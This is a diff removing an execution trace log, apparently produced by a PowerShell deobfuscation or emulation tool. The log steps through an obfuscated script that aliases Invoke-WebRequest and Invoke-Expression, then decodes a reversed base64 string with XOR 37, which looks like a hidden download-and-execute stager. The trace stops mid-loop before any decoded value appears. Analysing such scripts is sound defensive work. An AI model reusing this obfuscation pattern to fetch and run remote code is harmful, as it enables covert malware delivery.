@@ -1,844 +1,125 @@
-[19:41:53.119] === CFG 执行开始 ===
-[19:41:53.120] MaxIterations: 1000, MaxTotalNodes: 50000
-[19:41:53.120] 
-[19:41:53.121] === 初始化子图映射 ===
-[19:41:53.122]   [INIT] Total functions: 0, ScriptBlocks: 0
-[19:41:53.122] 
-[19:41:53.125] --- Node 1 [Start] ---
-[19:41:53.126]   Code: Script Start
-[19:41:53.127]   Status: SKIP
-[19:41:53.130] --- Node 3 [MainStart] ---
-[19:41:53.131]   Code: Main Script
-[19:41:53.131]   Status: SKIP
-[19:41:53.132] --- Node 5 [PipelineElement] ---
-[19:41:53.132]   Code: Set-Alias -name input -val Invoke-WebRequest
-[19:41:53.138]   Status: OK
-[19:41:53.139] --- Node 6 [PipelineElement] ---
-[19:41:53.139]   Code: Set-Alias -name output -val Invoke-Expression
-[19:41:53.140]   Status: OK
-[19:41:53.141] --- Node 7 [AssignmentStatementAst] ---
-[19:41:53.141]   Code: $a = "RM0RAZ0QVMxED1BHKIFRXpgSDtAQRZFRVpgCfYVVRFVT".ToCharArray()
-[19:41:53.163]   Status: OK
-[19:41:53.163]   VarsWritten:
-[19:41:53.165]     $a = [Object[]] Count=44
-[19:41:53.166] --- Node 8 [PipelineElement] ---
-[19:41:53.166]   Code: [aRRaY]::reVErse($a)
-[19:41:53.173]   Status: OK
-[19:41:53.173]   VarsRead:
-[19:41:53.174]     $a = [Object[]] Count=44
-[19:41:53.174] --- Node 9 [AssignmentStatementAst] ---
-[19:41:53.175]   Code: $b = [sYstEM.CoNveRt]::froMbasE64strING($a -join"")
-[19:41:53.198]   Status: OK
-[19:41:53.198]   VarsRead:
-[19:41:53.199]     $a = [Object[]] Count=44
-[19:41:53.199]   VarsWritten:
-[19:41:53.199]     $b = [Object[]] Count=33
-[19:41:53.200] --- Node 10 [LoopStart] ---
-[19:41:53.200]   Code: for ($x = 0; $x -lt $b.Count; $x++)
-[19:41:53.201]   Status: SKIP
-[19:41:53.202] --- Node 11 [ForInit] ---
-[19:41:53.202]   Code: $x = 0
-[19:41:53.204]   Status: OK
-[19:41:53.204]   VarsWritten:
-[19:41:53.204]     $x = 0
-[19:41:53.205] --- Node 12 [Condition] ---
-[19:41:53.205]   Code: [bool]($x -lt $b.Count)
-[19:41:53.211]   Status: OK
-[19:41:53.211]   VarsRead:
-[19:41:53.211]     $x = 0
-[19:41:53.212]     $b = [Object[]] Count=33
-[19:41:53.213]   Result: @(True)
-[19:41:53.213]   ConditionResult: True
-[19:41:53.214] --- Node 15 [AssignmentStatementAst] ---
-[19:41:53.215]   Code: ${B}[${x}] = ${B}[${X}] -bxor 37
-[19:41:53.224]   Status: OK
-[19:41:53.225]   VarsRead:
-[19:41:53.225]     $x = 0
-[19:41:53.225]     $B = [Object[]] Count=33
-[19:41:53.226]   VarsWritten:
-[19:41:53.226]     $B = [Object[]] Count=33
-[19:41:53.227] --- Node 14 [ForIter] ---
-[19:41:53.227]   Code: $x++
-[19:41:53.228]   Status: OK
-[19:41:53.229]   VarsRead:
-[19:41:53.229]     $x = 0
-[19:41:53.229]   VarsWritten:
-[19:41:53.230]     $x = 1
-[19:41:53.230] --- Node 12 [Condition] ---
-[19:41:53.231]   Code: [bool]($x -lt $b.Count)
-[19:41:53.236]   Status: OK
-[19:41:53.237]   VarsRead:
-[19:41:53.237]     $x = 1
-[19:41:53.238]     $b = [Object[]] Count=33
-[19:41:53.238]   Result: @(True)
-[19:41:53.238]   ConditionResult: True
-[19:41:53.239] --- Node 15 [AssignmentStatementAst] ---
-[19:41:53.239]   Code: ${B}[${x}] = ${B}[${X}] -bxor 37
-[19:41:53.247]   Status: OK
-[19:41:53.248]   VarsRead:
-[19:41:53.249]     $x = 1
-[19:41:53.249]     $B = [Object[]] Count=33
-[19:41:53.249]   VarsWritten:
-[19:41:53.250]     $B = [Object[]] Count=33
-[19:41:53.250] --- Node 14 [ForIter] ---
-[19:41:53.251]   Code: $x++
-[19:41:53.252]   Status: OK
-[19:41:53.252]   VarsRead:
-[19:41:53.253]     $x = 1
-[19:41:53.253]   VarsWritten:
-[19:41:53.253]     $x = 2
-[19:41:53.254] --- Node 12 [Condition] ---
-[19:41:53.254]   Code: [bool]($x -lt $b.Count)
-[19:41:53.259]   Status: OK
-[19:41:53.260]   VarsRead:
-[19:41:53.260]     $x = 2
-[19:41:53.260]     $b = [Object[]] Count=33
-[19:41:53.261]   Result: @(True)
-[19:41:53.261]   ConditionResult: True
-[19:41:53.262] --- Node 15 [AssignmentStatementAst] ---
-[19:41:53.262]   Code: ${B}[${x}] = ${B}[${X}] -bxor 37
-[19:41:53.270]   Status: OK
-[19:41:53.271]   VarsRead:
-[19:41:53.271]     $x = 2
-[19:41:53.272]     $B = [Object[]] Count=33
-[19:41:53.272]   VarsWritten:
-[19:41:53.274]     $B = [Object[]] Count=33
-[19:41:53.274] --- Node 14 [ForIter] ---
-[19:41:53.275]   Code: $x++
-[19:41:53.276]   Status: OK
-[19:41:53.277]   VarsRead:
-[19:41:53.277]     $x = 2
-[19:41:53.277]   VarsWritten:
-[19:41:53.278]     $x = 3
-[19:41:53.278] --- Node 12 [Condition] ---
-[19:41:53.279]   Code: [bool]($x -lt $b.Count)
-[19:41:53.284]   Status: OK
-[19:41:53.285]   VarsRead:
-[19:41:53.285]     $x = 3
-[19:41:53.286]     $b = [Object[]] Count=33
-[19:41:53.286]   Result: @(True)
-[19:41:53.286]   ConditionResult: True
-[19:41:53.287] --- Node 15 [AssignmentStatementAst] ---
-[19:41:53.287]   Code: ${B}[${x}] = ${B}[${X}] -bxor 37
-[19:41:53.296]   Status: OK
-[19:41:53.297]   VarsRead:
-[19:41:53.297]     $x = 3
-[19:41:53.297]     $B = [Object[]] Count=33
-[19:41:53.298]   VarsWritten:
-[19:41:53.298]     $B = [Object[]] Count=33
-[19:41:53.299] --- Node 14 [ForIter] ---
-[19:41:53.299]   Code: $x++
-[19:41:53.301]   Status: OK
-[19:41:53.301]   VarsRead:
-[19:41:53.302]     $x = 3
-[19:41:53.302]   VarsWritten:
-[19:41:53.302]     $x = 4
-[19:41:53.305] --- Node 12 [Condition] ---
-[19:41:53.305]   Code: [bool]($x -lt $b.Count)
-[19:41:53.311]   Status: OK
-[19:41:53.311]   VarsRead:
-[19:41:53.311]     $x = 4
-[19:41:53.312]     $b = [Object[]] Count=33
-[19:41:53.312]   Result: @(True)
-[19:41:53.312]   ConditionResult: True
-[19:41:53.313] --- Node 15 [AssignmentStatementAst] ---
-[19:41:53.313]   Code: ${B}[${x}] = ${B}[${X}] -bxor 37
-[19:41:53.321]   Status: OK
-[19:41:53.322]   VarsRead:
-[19:41:53.322]     $x = 4
-[19:41:53.323]     $B = [Object[]] Count=33
-[19:41:53.323]   VarsWritten:
-[19:41:53.323]     $B = [Object[]] Count=33
-[19:41:53.324] --- Node 14 [ForIter] ---
-[19:41:53.324]   Code: $x++
-[19:41:53.325]   Status: OK
-[19:41:53.326]   VarsRead:
-[19:41:53.326]     $x = 4
-[19:41:53.326]   VarsWritten:
-[19:41:53.327]     $x = 5
-[19:41:53.327] --- Node 12 [Condition] ---
-[19:41:53.327]   Code: [bool]($x -lt $b.Count)
-[19:41:53.333]   Status: OK
-[19:41:53.334]   VarsRead:
-[19:41:53.334]     $x = 5
-[19:41:53.335]     $b = [Object[]] Count=33
-[19:41:53.335]   Result: @(True)
-[19:41:53.335]   ConditionResult: True
-[19:41:53.336] --- Node 15 [AssignmentStatementAst] ---
-[19:41:53.336]   Code: ${B}[${x}] = ${B}[${X}] -bxor 37
-[19:41:53.344]   Status: OK
-[19:41:53.345]   VarsRead:
-[19:41:53.345]     $x = 5
-[19:41:53.345]     $B = [Object[]] Count=33
-[19:41:53.346]   VarsWritten:
-[19:41:53.346]     $B = [Object[]] Count=33
-[19:41:53.347] --- Node 14 [ForIter] ---
-[19:41:53.347]   Code: $x++
-[19:41:53.348]   Status: OK
-[19:41:53.348]   VarsRead:
-[19:41:53.349]     $x = 5
-[19:41:53.349]   VarsWritten:
-[19:41:53.349]     $x = 6
-[19:41:53.350] --- Node 12 [Condition] ---
-[19:41:53.350]   Code: [bool]($x -lt $b.Count)
-[19:41:53.356]   Status: OK
-[19:41:53.356]   VarsRead:
-[19:41:53.357]     $x = 6
-[19:41:53.357]     $b = [Object[]] Count=33
-[19:41:53.357]   Result: @(True)
-[19:41:53.358]   ConditionResult: True
-[19:41:53.358] --- Node 15 [AssignmentStatementAst] ---
-[19:41:53.359]   Code: ${B}[${x}] = ${B}[${X}] -bxor 37
-[19:41:53.367]   Status: OK
-[19:41:53.368]   VarsRead:
-[19:41:53.368]     $x = 6
-[19:41:53.369]     $B = [Object[]] Count=33
-[19:41:53.369]   VarsWritten:
-[19:41:53.369]     $B = [Object[]] Count=33
-[19:41:53.370] --- Node 14 [ForIter] ---
-[19:41:53.370]   Code: $x++
-[19:41:53.372]   Status: OK
-[19:41:53.373]   VarsRead:
-[19:41:53.373]     $x = 6
-[19:41:53.373]   VarsWritten:
-[19:41:53.374]     $x = 7
-[19:41:53.374] --- Node 12 [Condition] ---
-[19:41:53.374]   Code: [bool]($x -lt $b.Count)
-[19:41:53.380]   Status: OK
-[19:41:53.381]   VarsRead:
-[19:41:53.381]     $x = 7
-[19:41:53.382]     $b = [Object[]] Count=33
-[19:41:53.382]   Result: @(True)
-[19:41:53.382]   ConditionResult: True
-[19:41:53.383] --- Node 15 [AssignmentStatementAst] ---
-[19:41:53.383]   Code: ${B}[${x}] = ${B}[${X}] -bxor 37
-[19:41:53.393]   Status: OK
-[19:41:53.394]   VarsRead:
-[19:41:53.394]     $x = 7
-[19:41:53.394]     $B = [Object[]] Count=33
-[19:41:53.395]   VarsWritten:
-[19:41:53.395]     $B = [Object[]] Count=33
-[19:41:53.396] --- Node 14 [ForIter] ---
-[19:41:53.396]   Code: $x++
-[19:41:53.397]   Status: OK
-[19:41:53.398]   VarsRead:
-[19:41:53.398]     $x = 7
-[19:41:53.398]   VarsWritten:
-[19:41:53.399]     $x = 8
-[19:41:53.399] --- Node 12 [Condition] ---
-[19:41:53.400]   Code: [bool]($x -lt $b.Count)
-[19:41:53.406]   Status: OK
-[19:41:53.407]   VarsRead:
-[19:41:53.407]     $x = 8
-[19:41:53.407]     $b = [Object[]] Count=33
-[19:41:53.408]   Result: @(True)
-[19:41:53.408]   ConditionResult: True
-[19:41:53.409] --- Node 15 [AssignmentStatementAst] ---
-[19:41:53.409]   Code: ${B}[${x}] = ${B}[${X}] -bxor 37
-[19:41:53.418]   Status: OK
-[19:41:53.419]   VarsRead:
-[19:41:53.420]     $x = 8
-[19:41:53.421]     $B = [Object[]] Count=33
-[19:41:53.421]   VarsWritten:
-[19:41:53.421]     $B = [Object[]] Count=33
-[19:41:53.422] --- Node 14 [ForIter] ---
-[19:41:53.422]   Code: $x++
-[19:41:53.425]   Status: OK
-[19:41:53.425]   VarsRead:
-[19:41:53.426]     $x = 8
-[19:41:53.426]   VarsWritten:
-[19:41:53.427]     $x = 9
-[19:41:53.427] --- Node 12 [Condition] ---
-[19:41:53.428]   Code: [bool]($x -lt $b.Count)
-[19:41:53.435]   Status: OK
-[19:41:53.436]   VarsRead:
-[19:41:53.437]     $x = 9
-[19:41:53.437]     $b = [Object[]] Count=33
-[19:41:53.438]   Result: @(True)
-[19:41:53.438]   ConditionResult: True
-[19:41:53.439] --- Node 15 [AssignmentStatementAst] ---
-[19:41:53.439]   Code: ${B}[${x}] = ${B}[${X}] -bxor 37
-[19:41:53.448]   Status: OK
-[19:41:53.449]   VarsRead:
-[19:41:53.449]     $x = 9
-[19:41:53.449]     $B = [Object[]] Count=33
-[19:41:53.450]   VarsWritten:
-[19:41:53.450]     $B = [Object[]] Count=33
-[19:41:53.451] --- Node 14 [ForIter] ---
-[19:41:53.451]   Code: $x++
-[19:41:53.452]   Status: OK
-[19:41:53.453]   VarsRead:
-[19:41:53.453]     $x = 9
-[19:41:53.455]   VarsWritten:
-[19:41:53.455]     $x = 10
-[19:41:53.455] --- Node 12 [Condition] ---
-[19:41:53.456]   Code: [bool]($x -lt $b.Count)
-[19:41:53.461]   Status: OK
-[19:41:53.462]   VarsRead:
-[19:41:53.462]     $x = 10
-[19:41:53.462]     $b = [Object[]] Count=33
-[19:41:53.463]   Result: @(True)
-[19:41:53.463]   ConditionResult: True
-[19:41:53.463] --- Node 15 [AssignmentStatementAst] ---
-[19:41:53.464]   Code: ${B}[${x}] = ${B}[${X}] -bxor 37
-[19:41:53.472]   Status: OK
-[19:41:53.473]   VarsRead:
-[19:41:53.473]     $x = 10
-[19:41:53.473]     $B = [Object[]] Count=33
-[19:41:53.474]   VarsWritten:
-[19:41:53.474]     $B = [Object[]] Count=33
-[19:41:53.475] --- Node 14 [ForIter] ---
-[19:41:53.475]   Code: $x++
-[19:41:53.476]   Status: OK
-[19:41:53.477]   VarsRead:
-[19:41:53.477]     $x = 10
-[19:41:53.477]   VarsWritten:
-[19:41:53.478]     $x = 11
-[19:41:53.478] --- Node 12 [Condition] ---
-[19:41:53.478]   Code: [bool]($x -lt $b.Count)
-[19:41:53.485]   Status: OK
-[19:41:53.486]   VarsRead:
-[19:41:53.486]     $x = 11
-[19:41:53.486]     $b = [Object[]] Count=33
-[19:41:53.487]   Result: @(True)
-[19:41:53.487]   ConditionResult: True
-[19:41:53.488] --- Node 15 [AssignmentStatementAst] ---
-[19:41:53.488]   Code: ${B}[${x}] = ${B}[${X}] -bxor 37
-[19:41:53.496]   Status: OK
-[19:41:53.497]   VarsRead:
-[19:41:53.497]     $x = 11
-[19:41:53.497]     $B = [Object[]] Count=33
-[19:41:53.497]   VarsWritten:
-[19:41:53.498]     $B = [Object[]] Count=33
-[19:41:53.498] --- Node 14 [ForIter] ---
-[19:41:53.499]   Code: $x++
-[19:41:53.500]   Status: OK
-[19:41:53.500]   VarsRead:
-[19:41:53.500]     $x = 11
-[19:41:53.501]   VarsWritten:
-[19:41:53.501]     $x = 12
-[19:41:53.502] --- Node 12 [Condition] ---
-[19:41:53.502]   Code: [bool]($x -lt $b.Count)
-[19:41:53.507]   Status: OK
-[19:41:53.508]   VarsRead:
-[19:41:53.508]     $x = 12
-[19:41:53.508]     $b = [Object[]] Count=33
-[19:41:53.509]   Result: @(True)
-[19:41:53.509]   ConditionResult: True
-[19:41:53.510] --- Node 15 [AssignmentStatementAst] ---
-[19:41:53.510]   Code: ${B}[${x}] = ${B}[${X}] -bxor 37
-[19:41:53.519]   Status: OK
-[19:41:53.520]   VarsRead:
-[19:41:53.520]     $x = 12
-[19:41:53.521]     $B = [Object[]] Count=33
-[19:41:53.521]   VarsWritten:
-[19:41:53.521]     $B = [Object[]] Count=33
-[19:41:53.522] --- Node 14 [ForIter] ---
-[19:41:53.522]   Code: $x++
-[19:41:53.523]   Status: OK
-[19:41:53.524]   VarsRead:
-[19:41:53.524]     $x = 12
-[19:41:53.524]   VarsWritten:
-[19:41:53.525]     $x = 13
-[19:41:53.525] --- Node 12 [Condition] ---
-[19:41:53.525]   Code: [bool]($x -lt $b.Count)
-[19:41:53.531]   Status: OK
-[19:41:53.531]   VarsRead:
-[19:41:53.531]     $x = 13
-[19:41:53.532]     $b = [Object[]] Count=33
-[19:41:53.532]   Result: @(True)
-[19:41:53.532]   ConditionResult: True
-[19:41:53.533] --- Node 15 [AssignmentStatementAst] ---
-[19:41:53.533]   Code: ${B}[${x}] = ${B}[${X}] -bxor 37
-[19:41:53.542]   Status: OK
-[19:41:53.543]   VarsRead:
-[19:41:53.543]     $x = 13
-[19:41:53.543]     $B = [Object[]] Count=33
-[19:41:53.543]   VarsWritten:
-[19:41:53.544]     $B = [Object[]] Count=33
-[19:41:53.544] --- Node 14 [ForIter] ---
-[19:41:53.545]   Code: $x++
-[19:41:53.546]   Status: OK
-[19:41:53.546]   VarsRead:
-[19:41:53.546]     $x = 13
-[19:41:53.547]   VarsWritten:
-[19:41:53.547]     $x = 14
-[19:41:53.547] --- Node 12 [Condition] ---
-[19:41:53.548]   Code: [bool]($x -lt $b.Count)
-[19:41:53.553]   Status: OK
-[19:41:53.554]   VarsRead:
-[19:41:53.554]     $x = 14
-[19:41:53.554]     $b = [Object[]] Count=33
-[19:41:53.555]   Result: @(True)
-[19:41:53.555]   ConditionResult: True
-[19:41:53.555] --- Node 15 [AssignmentStatementAst] ---
-[19:41:53.556]   Code: ${B}[${x}] = ${B}[${X}] -bxor 37
-[19:41:53.564]   Status: OK
-[19:41:53.564]   VarsRead:
-[19:41:53.565]     $x = 14
-[19:41:53.565]     $B = [Object[]] Count=33
-[19:41:53.565]   VarsWritten:
-[19:41:53.566]     $B = [Object[]] Count=33
-[19:41:53.566] --- Node 14 [ForIter] ---
-[19:41:53.566]   Code: $x++
-[19:41:53.568]   Status: OK
-[19:41:53.570]   VarsRead:
-[19:41:53.570]     $x = 14
-[19:41:53.570]   VarsWritten:
-[19:41:53.571]     $x = 15
-[19:41:53.571] --- Node 12 [Condition] ---
-[19:41:53.572]   Code: [bool]($x -lt $b.Count)
-[19:41:53.577]   Status: OK
-[19:41:53.578]   VarsRead:
-[19:41:53.578]     $x = 15
-[19:41:53.578]     $b = [Object[]] Count=33
-[19:41:53.579]   Result: @(True)
-[19:41:53.579]   ConditionResult: True
-[19:41:53.579] --- Node 15 [AssignmentStatementAst] ---
-[19:41:53.580]   Code: ${B}[${x}] = ${B}[${X}] -bxor 37
-[19:41:53.588]   Status: OK
-[19:41:53.589]   VarsRead:
-[19:41:53.589]     $x = 15
-[19:41:53.589]     $B = [Object[]] Count=33
-[19:41:53.590]   VarsWritten:
-[19:41:53.590]     $B = [Object[]] Count=33
-[19:41:53.591] --- Node 14 [ForIter] ---
-[19:41:53.591]   Code: $x++
-[19:41:53.592]   Status: OK
-[19:41:53.593]   VarsRead:
-[19:41:53.593]     $x = 15
-[19:41:53.593]   VarsWritten:
-[19:41:53.594]     $x = 16
-[19:41:53.594] --- Node 12 [Condition] ---
-[19:41:53.595]   Code: [bool]($x -lt $b.Count)
-[19:41:53.601]   Status: OK
-[19:41:53.601]   VarsRead:
-[19:41:53.602]     $x = 16
-[19:41:53.602]     $b = [Object[]] Count=33
-[19:41:53.603]   Result: @(True)
-[19:41:53.603]   ConditionResult: True
-[19:41:53.603] --- Node 15 [AssignmentStatementAst] ---
-[19:41:53.604]   Code: ${B}[${x}] = ${B}[${X}] -bxor 37
-[19:41:53.612]   Status: OK
-[19:41:53.612]   VarsRead:
-[19:41:53.612]     $x = 16
-[19:41:53.613]     $B = [Object[]] Count=33
-[19:41:53.613]   VarsWritten:
-[19:41:53.613]     $B = [Object[]] Count=33
-[19:41:53.614] --- Node 14 [ForIter] ---
-[19:41:53.614]   Code: $x++
-[19:41:53.615]   Status: OK
-[19:41:53.616]   VarsRead:
-[19:41:53.616]     $x = 16
-[19:41:53.616]   VarsWritten:
-[19:41:53.617]     $x = 17
-[19:41:53.617] --- Node 12 [Condition] ---
-[19:41:53.617]   Code: [bool]($x -lt $b.Count)
-[19:41:53.624]   Status: OK
-[19:41:53.624]   VarsRead:
-[19:41:53.624]     $x = 17
-[19:41:53.625]     $b = [Object[]] Count=33
-[19:41:53.625]   Result: @(True)
-[19:41:53.625]   ConditionResult: True
-[19:41:53.626] --- Node 15 [AssignmentStatementAst] ---
-[19:41:53.626]   Code: ${B}[${x}] = ${B}[${X}] -bxor 37
-[19:41:53.635]   Status: OK
-[19:41:53.636]   VarsRead:
-[19:41:53.636]     $x = 17
-[19:41:53.636]     $B = [Object[]] Count=33
-[19:41:53.637]   VarsWritten:
-[19:41:53.637]     $B = [Object[]] Count=33
-[19:41:53.638] --- Node 14 [ForIter] ---
-[19:41:53.638]   Code: $x++
-[19:41:53.639]   Status: OK
-[19:41:53.640]   VarsRead:
-[19:41:53.640]     $x = 17
-[19:41:53.640]   VarsWritten:
-[19:41:53.641]     $x = 18
-[19:41:53.641] --- Node 12 [Condition] ---
-[19:41:53.641]   Code: [bool]($x -lt $b.Count)
-[19:41:53.646]   Status: OK
-[19:41:53.647]   VarsRead:
-[19:41:53.647]     $x = 18
-[19:41:53.647]     $b = [Object[]] Count=33
-[19:41:53.648]   Result: @(True)
-[19:41:53.648]   ConditionResult: True
-[19:41:53.648] --- Node 15 [AssignmentStatementAst] ---
-[19:41:53.649]   Code: ${B}[${x}] = ${B}[${X}] -bxor 37
-[19:41:53.658]   Status: OK
-[19:41:53.659]   VarsRead:
-[19:41:53.659]     $x = 18
-[19:41:53.659]     $B = [Object[]] Count=33
-[19:41:53.660]   VarsWritten:
-[19:41:53.660]     $B = [Object[]] Count=33
-[19:41:53.660] --- Node 14 [ForIter] ---
-[19:41:53.661]   Code: $x++
-[19:41:53.662]   Status: OK
-[19:41:53.662]   VarsRead:
-[19:41:53.663]     $x = 18
-[19:41:53.663]   VarsWritten:
-[19:41:53.663]     $x = 19
-[19:41:53.664] --- Node 12 [Condition] ---
-[19:41:53.664]   Code: [bool]($x -lt $b.Count)
-[19:41:53.670]   Status: OK
-[19:41:53.670]   VarsRead:
-[19:41:53.670]     $x = 19
-[19:41:53.671]     $b = [Object[]] Count=33
-[19:41:53.671]   Result: @(True)
-[19:41:53.672]   ConditionResult: True
-[19:41:53.672] --- Node 15 [AssignmentStatementAst] ---
-[19:41:53.672]   Code: ${B}[${x}] = ${B}[${X}] -bxor 37
-[19:41:53.680]   Status: OK
-[19:41:53.681]   VarsRead:
-[19:41:53.681]     $x = 19
-[19:41:53.681]     $B = [Object[]] Count=33
-[19:41:53.682]   VarsWritten:
-[19:41:53.682]     $B = [Object[]] Count=33
-[19:41:53.682] --- Node 14 [ForIter] ---
-[19:41:53.683]   Code: $x++
-[19:41:53.686]   Status: OK
-[19:41:53.686]   VarsRead:
-[19:41:53.687]     $x = 19
-[19:41:53.687]   VarsWritten:
-[19:41:53.687]     $x = 20
-[19:41:53.688] --- Node 12 [Condition] ---
-[19:41:53.688]   Code: [bool]($x -lt $b.Count)
-[19:41:53.693]   Status: OK
-[19:41:53.694]   VarsRead:
-[19:41:53.694]     $x = 20
-[19:41:53.694]     $b = [Object[]] Count=33
-[19:41:53.695]   Result: @(True)
-[19:41:53.695]   ConditionResult: True
-[19:41:53.696] --- Node 15 [AssignmentStatementAst] ---
-[19:41:53.696]   Code: ${B}[${x}] = ${B}[${X}] -bxor 37
-[19:41:53.704]   Status: OK
-[19:41:53.705]   VarsRead:
-[19:41:53.705]     $x = 20
-[19:41:53.705]     $B = [Object[]] Count=33
-[19:41:53.706]   VarsWritten:
-[19:41:53.706]     $B = [Object[]] Count=33
-[19:41:53.706] --- Node 14 [ForIter] ---
-[19:41:53.707]   Code: $x++
-[19:41:53.708]   Status: OK
-[19:41:53.708]   VarsRead:
-[19:41:53.708]     $x = 20
-[19:41:53.709]   VarsWritten:
-[19:41:53.709]     $x = 21
-[19:41:53.710] --- Node 12 [Condition] ---
-[19:41:53.710]   Code: [bool]($x -lt $b.Count)
-[19:41:53.717]   Status: OK
-[19:41:53.717]   VarsRead:
-[19:41:53.717]     $x = 21
-[19:41:53.718]     $b = [Object[]] Count=33
-[19:41:53.718]   Result: @(True)
-[19:41:53.719]   ConditionResult: True
-[19:41:53.719] --- Node 15 [AssignmentStatementAst] ---
-[19:41:53.719]   Code: ${B}[${x}] = ${B}[${X}] -bxor 37
-[19:41:53.728]   Status: OK
-[19:41:53.729]   VarsRead:
-[19:41:53.729]     $x = 21
-[19:41:53.729]     $B = [Object[]] Count=33
-[19:41:53.730]   VarsWritten:
-[19:41:53.730]     $B = [Object[]] Count=33
-[19:41:53.730] --- Node 14 [ForIter] ---
-[19:41:53.731]   Code: $x++
-[19:41:53.732]   Status: OK
-[19:41:53.732]   VarsRead:
-[19:41:53.733]     $x = 21
-[19:41:53.733]   VarsWritten:
-[19:41:53.733]     $x = 22
-[19:41:53.734] --- Node 12 [Condition] ---
-[19:41:53.734]   Code: [bool]($x -lt $b.Count)
-[19:41:53.740]   Status: OK
-[19:41:53.740]   VarsRead:
-[19:41:53.741]     $x = 22
-[19:41:53.741]     $b = [Object[]] Count=33
-[19:41:53.741]   Result: @(True)
-[19:41:53.742]   ConditionResult: True
-[19:41:53.742] --- Node 15 [AssignmentStatementAst] ---
-[19:41:53.742]   Code: ${B}[${x}] = ${B}[${X}] -bxor 37
-[19:41:53.752]   Status: OK
-[19:41:53.752]   VarsRead:
-[19:41:53.753]     $x = 22
-[19:41:53.753]     $B = [Object[]] Count=33
-[19:41:53.753]   VarsWritten:
-[19:41:53.754]     $B = [Object[]] Count=33
-[19:41:53.754] --- Node 14 [ForIter] ---
-[19:41:53.755]   Code: $x++
-[19:41:53.756]   Status: OK
-[19:41:53.756]   VarsRead:
-[19:41:53.757]     $x = 22
-[19:41:53.757]   VarsWritten:
-[19:41:53.757]     $x = 23
-[19:41:53.758] --- Node 12 [Condition] ---
-[19:41:53.758]   Code: [bool]($x -lt $b.Count)
-[19:41:53.763]   Status: OK
-[19:41:53.764]   VarsRead:
-[19:41:53.764]     $x = 23
-[19:41:53.764]     $b = [Object[]] Count=33
-[19:41:53.765]   Result: @(True)
-[19:41:53.765]   ConditionResult: True
-[19:41:53.766] --- Node 15 [AssignmentStatementAst] ---
-[19:41:53.766]   Code: ${B}[${x}] = ${B}[${X}] -bxor 37
-[19:41:53.775]   Status: OK
-[19:41:53.775]   VarsRead:
-[19:41:53.776]     $x = 23
-[19:41:53.776]     $B = [Object[]] Count=33
-[19:41:53.776]   VarsWritten:
-[19:41:53.777]     $B = [Object[]] Count=33
-[19:41:53.777] --- Node 14 [ForIter] ---
-[19:41:53.778]   Code: $x++
-[19:41:53.779]   Status: OK
-[19:41:53.779]   VarsRead:
-[19:41:53.779]     $x = 23
-[19:41:53.780]   VarsWritten:
-[19:41:53.780]     $x = 24
-[19:41:53.781] --- Node 12 [Condition] ---
-[19:41:53.781]   Code: [bool]($x -lt $b.Count)
-[19:41:53.786]   Status: OK
-[19:41:53.787]   VarsRead:
-[19:41:53.787]     $x = 24
-[19:41:53.787]     $b = [Object[]] Count=33
-[19:41:53.788]   Result: @(True)
-[19:41:53.788]   ConditionResult: True
-[19:41:53.788] --- Node 15 [AssignmentStatementAst] ---
-[19:41:53.789]   Code: ${B}[${x}] = ${B}[${X}] -bxor 37
-[19:41:53.796]   Status: OK
-[19:41:53.797]   VarsRead:
-[19:41:53.797]     $x = 24
-[19:41:53.797]     $B = [Object[]] Count=33
-[19:41:53.798]   VarsWritten:
-[19:41:53.798]     $B = [Object[]] Count=33
-[19:41:53.798] --- Node 14 [ForIter] ---
-[19:41:53.799]   Code: $x++
-[19:41:53.802]   Status: OK
-[19:41:53.802]   VarsRead:
-[19:41:53.803]     $x = 24
-[19:41:53.803]   VarsWritten:
-[19:41:53.803]     $x = 25
-[19:41:53.804] --- Node 12 [Condition] ---
-[19:41:53.804]   Code: [bool]($x -lt $b.Count)
-[19:41:53.810]   Status: OK
-[19:41:53.810]   VarsRead:
-[19:41:53.810]     $x = 25
-[19:41:53.811]     $b = [Object[]] Count=33
-[19:41:53.811]   Result: @(True)
-[19:41:53.811]   ConditionResult: True
-[19:41:53.812] --- Node 15 [AssignmentStatementAst] ---
-[19:41:53.812]   Code: ${B}[${x}] = ${B}[${X}] -bxor 37
-[19:41:53.820]   Status: OK
-[19:41:53.821]   VarsRead:
-[19:41:53.821]     $x = 25
-[19:41:53.822]     $B = [Object[]] Count=33
-[19:41:53.822]   VarsWritten:
-[19:41:53.822]     $B = [Object[]] Count=33
-[19:41:53.823] --- Node 14 [ForIter] ---
-[19:41:53.823]   Code: $x++
-[19:41:53.824]   Status: OK
-[19:41:53.825]   VarsRead:
-[19:41:53.825]     $x = 25
-[19:41:53.825]   VarsWritten:
-[19:41:53.826]     $x = 26
-[19:41:53.826] --- Node 12 [Condition] ---
-[19:41:53.826]   Code: [bool]($x -lt $b.Count)
-[19:41:53.833]   Status: OK
-[19:41:53.833]   VarsRead:
-[19:41:53.833]     $x = 26
-[19:41:53.834]     $b = [Object[]] Count=33
-[19:41:53.834]   Result: @(True)
-[19:41:53.834]   ConditionResult: True
-[19:41:53.835] --- Node 15 [AssignmentStatementAst] ---
-[19:41:53.835]   Code: ${B}[${x}] = ${B}[${X}] -bxor 37
-[19:41:53.843]   Status: OK
-[19:41:53.844]   VarsRead:
-[19:41:53.844]     $x = 26
-[19:41:53.844]     $B = [Object[]] Count=33
-[19:41:53.845]   VarsWritten:
-[19:41:53.845]     $B = [Object[]] Count=33
-[19:41:53.846] --- Node 14 [ForIter] ---
-[19:41:53.846]   Code: $x++
-[19:41:53.847]   Status: OK
-[19:41:53.847]   VarsRead:
-[19:41:53.848]     $x = 26
-[19:41:53.848]   VarsWritten:
-[19:41:53.848]     $x = 27
-[19:41:53.849] --- Node 12 [Condition] ---
-[19:41:53.849]   Code: [bool]($x -lt $b.Count)
-[19:41:53.855]   Status: OK
-[19:41:53.856]   VarsRead:
-[19:41:53.856]     $x = 27
-[19:41:53.857]     $b = [Object[]] Count=33
-[19:41:53.857]   Result: @(True)
-[19:41:53.857]   ConditionResult: True
-[19:41:53.858] --- Node 15 [AssignmentStatementAst] ---
-[19:41:53.858]   Code: ${B}[${x}] = ${B}[${X}] -bxor 37
-[19:41:53.868]   Status: OK
-[19:41:53.869]   VarsRead:
-[19:41:53.869]     $x = 27
-[19:41:53.869]     $B = [Object[]] Count=33
-[19:41:53.870]   VarsWritten:
-[19:41:53.870]     $B = [Object[]] Count=33
-[19:41:53.871] --- Node 14 [ForIter] ---
-[19:41:53.871]   Code: $x++
-[19:41:53.873]   Status: OK
-[19:41:53.873]   VarsRead:
-[19:41:53.873]     $x = 27
-[19:41:53.874]   VarsWritten:
-[19:41:53.874]     $x = 28
